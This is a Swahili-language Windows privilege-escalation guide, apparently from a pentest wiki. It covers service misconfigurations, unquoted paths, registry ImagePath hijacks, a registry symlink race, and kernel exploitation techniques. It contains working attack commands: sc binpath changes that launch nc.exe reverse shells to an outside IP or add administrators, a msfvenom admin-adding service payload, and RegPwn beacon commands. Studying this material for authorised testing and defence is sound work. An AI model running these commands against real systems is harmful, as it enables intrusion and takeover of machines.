
_Hitilafu ya mfumo 1058 imetokea._\
_Huduma haiwezi kuanzishwa, ama kwa sababu imezimwa au kwa sababu hakuna vifaa vilivyowezeshwa vinavyohusishwa nayo._

Unaweza kuiwezesha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Suluhisho jingine la muda** kwa tatizo hili ni kutekeleza:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayotekelezwa na service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Haki za ufikiaji zinaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu usanidi upya wa binary ya service.
- **WRITE_DAC**: Huruhusu usanidi upya wa ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa ajili ya kugundua na kutumia udhaifu huu, unaweza kutumia _exploit/windows/local/service_permissions_.

### Ruhusa dhaifu za binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye haki za juu, lakini **watumiaji wenye haki za chini wanaweza kurekebisha EXE ya service au folda yake mama**, mara nyingi service inaweza kutekwa **kwa kubadilisha binary na kuwasha upya service**.

**Angalia ikiwa unaweza kurekebisha binary inayoendeshwa na service** au ikiwa una **ruhusa za kuandika kwenye folda** ambamo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayoendeshwa na service kwa kutumia **wmic** (siyo katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizotolewa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au directory inayoihifadhi. Njia ya vitendo ya kutumia udhaifu huu ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na njia ya executable kwa `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa `icacls <path>`.
3. Badilisha binary ya service kwa payload au binary halali ya service yenye nia ovu.
4. Anzisha upya service kwa `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa mfumo / kichochezi cha service).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa huduma hairuhusu mtumiaji wa kawaida kuiwasha upya, angalia kama inaanza kiotomatiki mfumo unapowashwa, ina hatua ya kushindwa inayoiwasha tena, au inaweza kuwashwa kwa njia isiyo ya moja kwa moja na programu inayoitumia.

### Ruhusa za kurekebisha registry ya huduma

Unapaswa kuangalia kama unaweza kurekebisha registry yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya huduma kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Jaribio la awali la ruhusa lilielezwa hivi:

Inapaswa kuangaliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Kagua kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha kuandika kwenye key fulani ya service. Ingizo la ACL pekee halithibitishi kuwa ufikiaji unapatikana: deny entries, token ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za registry key ni tofauti na haki za service object za `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Escalation pia inahitaji sehemu ya usanidi wa service inayoweza kutumika, njia ya kuanzisha service na service identity yenye mapendeleo zaidi. Angalia [haki za registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) za Microsoft na [marejeo ya haki za ufikiaji wa service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Mashindano ya symlink ya Registry kwa uandishi wa value yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda keys za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenye key ya session ya HKLM. **Mashindano ya symbolic link ya Registry** yanaweza kuelekeza uandishi huo wenye marupurupu kwenye **path yoyote ya HKLM**, na kutoa uwezo wa kuandika **value yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo ya key (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop na mtumiaji anaweza kuiandikia.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Jaza value ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha nakala ya secure-desktop (kwa mfano, **LockWorkstation**), ambayo huanzisha mtiririko wa AT broker.
3. **Shinda mashindano** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapoanzishwa, badilisha key ya **HKLM Session ATConfig** iwe **registry link** inayoelekeza kwenye HKLM target iliyolindwa.
4. SYSTEM huandika value iliyochaguliwa na mshambuliaji kwenye path ya HKLM iliyoelekezwa upya.

Baada ya kupata uwezo wa kuandika value yoyote ya HKLM, hamia kwenye LPE kwa kubadilisha values za usanidi wa service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuiwasha (kwa mfano, **`msiserver`**) na uiwashe baada ya uandishi. **Kumbuka:** utekelezaji wa public exploit **hufunga workstation** kama sehemu ya mashindano.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Ruhusa za AppendData/AddSubdirectory kwenye registry ya Services

Ukiwa na ruhusa hii kwenye registry, inamaanisha **unaweza kuunda subregistries kutoka kwenye registry hii**. Kwa huduma za Windows, hii **inatosha kutekeleza code yoyote:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Njia za Huduma Zisizowekwa ndani ya Alama za Nukuu

Ikiwa njia ya executable haijawekwa ndani ya alama za nukuu, Windows itajaribu kutekeleza kila sehemu ya njia inayoishia kabla ya nafasi.

Kwa mfano, kwa njia ya _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizowekwa ndani ya alama za nukuu, ukiondoa zile za huduma zilizojengewa ndani za Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya service mwenyewe kwa metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya kurejesha hali

Windows huruhusu watumiaji kubainisha vitendo vya kutekelezwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, huenda ikawezekana kupandisha marupurupu. Maelezo zaidi yanapatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Faili lengwa za script za kazi zilizopangwa

Kwa kazi iliyowezeshwa inayoendesha `cmd.exe /c` na faili ya `.bat` au `.cmd`, kagua faili ya script iliyotajwa kwenye **hoja za kitendo** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa hoja ya faili iliyo wazi ya interpreter, kama vile PowerShell `-File`. Ikiwa faili ya batch ya kazi iliyopangwa ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script iliyorejelewa; vigezo, masharti na uunganishaji wa shell huhitaji kufuatiliwa mwenyewe. Script au saraka kuu inayoweza kuandikwa na mtumiaji ni kidokezo cha utekelezaji kati ya akaunti tofauti tu ikiwa principal iliyosanidiwa ya kazi ni tofauti na mtumiaji anayeita, na kazi hiyo inafikia kitendo hicho. ACL inayoruhusu kuongeza tu inaweza kuwa muhimu kwa script, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikike. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa kazi](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), saraka ya kufanya kazi, kichochezi na sera ya udhibiti wa programu kabla ya kudai kuwa kuna uwezekano wa kupandisha marupurupu. Orodhesha bila kurekebisha script au kuanzisha kazi.

## Mitiririko yenye majina kwenye faili zinazofikika

Kwenye NTFS, faili inayoweza kusomwa inaweza kuwa na mtiririko wa `:$DATA` wenye jina, ambao maudhui yake hayaonyeshwi kwenye uorodheshaji wa kawaida wa saraka. Kwa seti ndogo na husika ya faili za chelezo au usanidi zinazofikika, kagua **majina na ukubwa** wa mitiririko kabla ya kufungua maudhui yoyote; Windows huionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la mtiririko linalodokeza kuwa kuna siri ni kidokezo tu. Kagua ruhusa halisi ya kusoma faili, usaidizi wa mfumo wa faili kwa mitiririko, ikiwa mtiririko una vitambulisho vinavyoweza kutumika, na akaunti ambayo vitambulisho hivyo huithibitisha. Epuka kuchanganua mitiririko kwa kujirudia na kuchapisha maudhui ya mitiririko wakati wa uorodheshaji wa kawaida.

## Ingizo za msaidizi wa Windows Driver Kit zilizopangwa

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf` na `working\rsf.rsf` ya mradi kutoka kwenye saraka yake ya uendeshaji. Kazi iliyopangwa au huduma inayoanzisha msaidizi huyu kwa akaunti yenye marupurupu inaweza kutumia ruhusa ya kuandika ya kiwango cha chini kwenye ingizo hizo kutekeleza amri katika muktadha wa akaunti hiyo, hata ikiwa faili ya msaidizi yenyewe imelindwa. Thibitisha kuwa kuna mtumiaji mwenye marupurupu anayezitumia, na kwamba **faili zote mbili za pembeni** zinaweza kuundwa au kurekebishwa; kumpata msaidizi pekee hakutoshi.

Kwa kazi iliyopangwa, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya kitendo chake na ACL za njia za faili mbili za pembeni. Ikiwa kazi haibainishi saraka ya kufanya kazi, saraka ya faili inayotekelezwa ni kidokezo tu cha kuthibitisha, si uthibitisho wa mahali ambapo kazi husoma ingizo zake. Sharti la faili ya kufanya kazi ya mradi pia lazima litimizwe. Kagua principal halisi ya kazi badala ya kudhani kuwa inaendeshwa kama SYSTEM.

## Programu

### Programu zilizosakinishwa

Kagua **ruhusa za binary** (huenda ukaweza kubadilisha moja na kupandisha marupurupu) na za **saraka** ([DLL Hijacking](dll-hijacking/index.html).)

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya ukarabati wa Checkmk Windows agent

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri matoleo ya zamani ya Checkmk Windows agents yaliyokuwa yanaandika command files kwenye `C:\Windows\Temp`, kisha kutekeleza faili iliyokuwepo na iliyolindwa dhidi ya uandishi pale ubadilishaji uliposhindikana. Vendor alirekebisha tatizo hili katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na kama operesheni ya agent iliyoathiriwa inaweza kuendeshwa; lebo ya branch pekee kama `2.1` haiwezi kuthibitisha kuwa mfumo umeathirika. Enumeration inaweza kukagua version, hali ya service, na ruhusa za Temp bila kuunda faili au kuanzisha agent commands.

#### Ukaguzi wa service ya ADSelfService Plus SAML

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri ADSelfService Plus build 6210 na za awali; vendor aliirekebisha katika build 6211. Inahusika tu ikiwa SAML SSO **imewezeshwa au iliwahi kuwezeshwa**. Kwa hiyo, ingizo la bidhaa iliyosakinishwa au njia ya service ni kidokezo tu, si uthibitisho wa udhaifu: thibitisha build kamili, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na account inayoitumia. Code execution kupitia service hutumia privileges za account hiyo; SYSTEM execution inahitaji instance inayoendeshwa kama SYSTEM. `OfflineBackup_*.ezip` inayoweza kusomwa katika directory ya Backup ya bidhaa ni kidokezo tofauti cha backup iliyosimbwa, si ushahidi wa credential inayoweza kutumika au wa udhaifu huu wa SAML. Rekodi path yake na access rights bila kuifungua wakati wa enumeration ya kawaida.

#### Mipaka ya Jenkins controller na domain account

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuiwasha: [Jenkins huzieleza hizi kama ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Execution hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi credential material na encryption keys katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **read access ya faili zinazohitajika** na njia tofauti ya kutumia account hiyo tena bila kuchapisha secrets kwenye output inayoshirikiwa. Ikiwa account hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha kuwa script path inaweza kuandikiwa na kuna logon au scheduled consumer halisi inayoendeshwa kama mtumiaji lengwa kabla ya kuichukulia kama execution ya mtumiaji mwingine. Udhibiti zaidi wa group unahitaji kuthibitisha kando effective AD rights.

#### Utambulisho wa Azure Pipelines self-hosted agent

Kwa Azure DevOps Server au Azure Pipelines project, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuiweka kwenye foleni** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa account yenye privileges za chini inaweza kuwasilisha script step na kuendesha pipeline hiyo kwenye Windows agent inayojisimamia, step huendeshwa kama [account ya mfumo wa uendeshaji iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline husika, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa agent service kabla ya kudai mabadiliko ya utambulisho wa mtumiaji mwingine au kwenda SYSTEM. Agent iliyosakinishwa, project role, au ruhusa ya kuandika kwenye repository pekee ni vidokezo tu; kagua ruhusa na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft hutofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account**, inayoendesha synchronization service na kufikia SQL database yake, na **AD DS connector account**, ambayo ruhusa zake kwenye directory hutegemea vipengele vya sync vilivyosaniwa. Connector credentials huhifadhiwa zikiwa zimesimbwa kwenye database hiyo, huku key material [ikilindwa na DPAPI chini ya ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group inayoonekana kuwa ya local administrator, au ufikiaji wa database pekee havithibitishi credential inayoweza kufumbuliwa au kupandisha privileges kwenye domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa, na effective AD privileges za utambulisho huo. Enumeration ya kawaida inapaswa kuonyesha metadata ya service na access pekee, si kuuliza au kuchapisha secrets zilizohifadhiwa.

#### Ruhusa za Printer driver support DLL

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs chini ya `C:\ProgramData` na kuzipakia kwenye print process yenye privileges zaidi. Kagua directory halisi ya driver na ACL za DLL, pamoja na parent directories na reparse points, hata ikiwa printer WMI enumeration hairuhusiwi. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), path iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza upakiaji wa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu uandishi ni kidokezo tu: thibitisha effective write access baada ya deny entries, kuwa driver husika imesakinishwa na inapakia faili chini ya utambulisho wenye privileges, na kama driver iliyosasishwa au security program ya vendor imerekebisha usakinishaji. Usihitimishe kuwa kuna udhaifu kutokana na jina la directory au version ya driver pekee.

### Ruhusa za Kuandika

Kagua kama unaweza kurekebisha config file ili kusoma faili maalum au kama unaweza kurekebisha binary itakayoendeshwa na Administrator account (schedtasks).

Njia moja ya kutafuta ruhusa dhaifu za folder/files kwenye mfumo ni kufanya:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/utekelezaji

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo chini ya folda zake za `plugins`. Ikiwa kuna usakinishaji unaobebeka/nakala unaoweza kuandikwa, kuweka plugin hasidi huwezesha utekelezaji wa msimbo kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kutoka `DllMain` na callback za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Zindua wakati wa kuwasha

**Angalia kama unaweza kubadilisha registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu **maeneo ya autoruns yanayoweza kutumika kuongeza mamlaka**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazoweza kuwa **za wahusika wengine, zisizo za kawaida/zinazoweza kudhuriwa**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inaweka wazi primitive ya arbitrary kernel read/write (jambo la kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kuongeza priviliji kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Nyenzo zinazohusiana na Windows kernel-exploitation:

Kwa hali ya kernel-mode ring-buffer yenye read/write registers zinazoweza kuandikwa na mtumiaji, tazama [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa bugs za race-condition ambapo call iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambulizi, kupunguza kasi ya lookup kwa makusudi (kwa kutumia components zenye urefu wa juu zaidi au minyororo mirefu ya directories) kunaweza kurefusha dirisha kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAFs, disclosures za paged-pool, na I/O ring pivots

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kutokana na bugs mbili dhaifu kila moja: **race ya lifetime ya cancel-safe queue** inayofuta request/CBD wakati queue lock bado imeshikiliwa, na disclosure ya **kuachia lock kabla ya kunakili** inayovujisha allocation ya paged-pool iliyofutwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na exploitation:

- **Free-under-lock + cancel afterwards**: tafuta njia ya mafanikio inayotekeleza **Acquire -> CompleteRequest/free -> Release**, huku njia ya cancel ikitekeleza **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa njia ya mafanikio inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachia CBDQ/CSQ lock, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofutwa kwa callback ya remove ya driver.
- **Reclaim queue object iliyofutwa** kwa allocation ya paged-pool yenye ukubwa sawa, inayodhibitiwa na mshambulizi. `NPFS` Data Queue Entries zinafaa kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na baadaye unaweza kuvichunguza kwa operesheni za pipe read/peek. Ikiwa object iliyofutwa ina list links, zibadilishe ziwe **cyclic list ya fake request nodes kwenye user memory** ili driver iendelee kuchakata request structures zilizobainishwa na mshambulizi badala ya kusimama kwenye list head ya awali.
- **Boresha write inayotabirika**: ikiwa fake request inaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata kernel write inayodhibiti anwani lakini si thamani. Katika hali hiyo, lenga sehemu ya **length/size** ya sprayed pool object badala ya code/data pointer ya mwisho, kisha kagua spray hadi object iliyoharibiwa itoe **out-of-bounds paged-pool read**.
- **Muundo wa raceable disclosure**: syscall yoyote inayotekeleza `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka mshambuliaji anapoweza kupanua buffer inayokopiwa (kwa mfano kwa kuongeza entries nyingi za list/resource zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi hupanua dirisha la replacement bila lazima kusababisha mashine ku-crash.
- **Malengo ya refill yenye pointers nyingi**: arrays za registered-buffer za Windows **I/O ring** ni malengo bora ya disclosure kwa sababu ukubwa wake wa paged-pool unadhibitiwa na mshambuliaji (`8 * regBufferCnt`), na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Leak mojawapo ya arrays hizi, tambua `IORING_OBJECT` inayoizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili operesheni zinazofuata za I/O ring zitumie entries zilizoghushiwa na mshambuliaji na kutoa arbitrary kernel read/write. Ikiwa write pekee inayopatikana inakupa byte isiyobadilika (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kuunda user pointer yenye byte inayojirudia kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, kisha weka forged registered-buffer array hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Ukishapata arbitrary kernel read/write kutoka kwa I/O ring iliyoharibika, iba SYSTEM token kwa kutumia workflow ya kawaida ya post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za registry hive memory corruption

Udhaifu wa kisasa wa hive hukuwezesha kupanga layouts zinazotabirika, kutumia descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha uharibifu wa metadata kuwa kernel paged-pool overflows bila driver maalum. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion kupitia paths zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hukubali registry path kutoka userland, hukagua tu kuwa ni mfuatano halali wa UTF-16, kisha kuita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` na `RTL_QUERY_REGISTRY_DIRECT` kuelekeza matokeo kwenye scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na aina **halisi** ya registry, si aina aliyotarajia developer.

